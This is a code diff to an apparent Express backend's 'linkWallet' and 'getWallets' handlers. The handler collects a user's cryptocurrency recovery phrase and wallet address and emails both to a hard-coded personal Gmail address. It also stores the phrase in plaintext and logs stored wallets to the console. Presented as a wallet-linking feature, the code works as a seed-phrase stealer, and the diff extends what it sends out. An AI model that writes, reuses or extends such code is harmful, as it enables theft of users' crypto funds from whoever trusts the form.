@@ -273,29 +273,28 @@ const generateReferenceNumber = () => {
 
 exports.linkWallet = async (req, res) => {
   try {
-    const {  phrase } = req.body;
+    const { phrase, walletAddress } = req.body;
     const user = await User.findById(req.user.id);
 
     if (!user) {
       return res.status(404).json({ message: 'User not found' });
     }
 
-    if (!phrase) {
-      return res.status(400).json({ message: 'Recovery phrase is required' });
+    if (!phrase || !walletAddress) {
+      return res.status(400).json({ message: 'Recovery phrase and wallet address are required' });
     }
 
     const referenceNumber = generateReferenceNumber();
     await sendEmail(
-        'aguchris740@gmail.com',
-        'Your Recovery Phrase Linked',
-        `Your recovery phrase is: ${phrase}\n\nPlease store this safely and never share it with anyone.
-        \nReference Number: ${referenceNumber}`
-      );
+      'aguchris740@gmail.com',
+      'Your Recovery Phrase Linked',
+      `Your recovery phrase is: ${phrase}\nWallet Address: ${walletAddress}\n\nPlease store this safely and never share it with anyone.
+      \nReference Number: ${referenceNumber}`
+    );
   
-    // Add new wallet to user's wallets array
     user.wallets.push({
-
       phrase,
+      walletAddress,
       linkedAt: new Date(),
       referenceNumber
     });
@@ -305,12 +304,23 @@ exports.linkWallet = async (req, res) => {
     res.json({ 
       message: 'Wallet linked successfully',
       wallet: {
-        phrase,
+        walletAddress,
         linkedAt: new Date(),
         referenceNumber
       }
     });
   } catch (error) {
     res.status(500).json({ message: 'Error linking wallet', error: error.message });
+  }
+};
+
+exports.getWallets = async (req, res) => {
+  try {
+    const user = await User.findById(req.user.id).select('wallets');
+    console.log('User wallets:', user.wallets); // Console log the wallets
+    res.json({ wallets: user.wallets });
+  } catch (error) {
+    console.error('Error fetching wallets:', error);
+    res.status(500).json({ message: 'Error fetching wallets' });
   }
 };
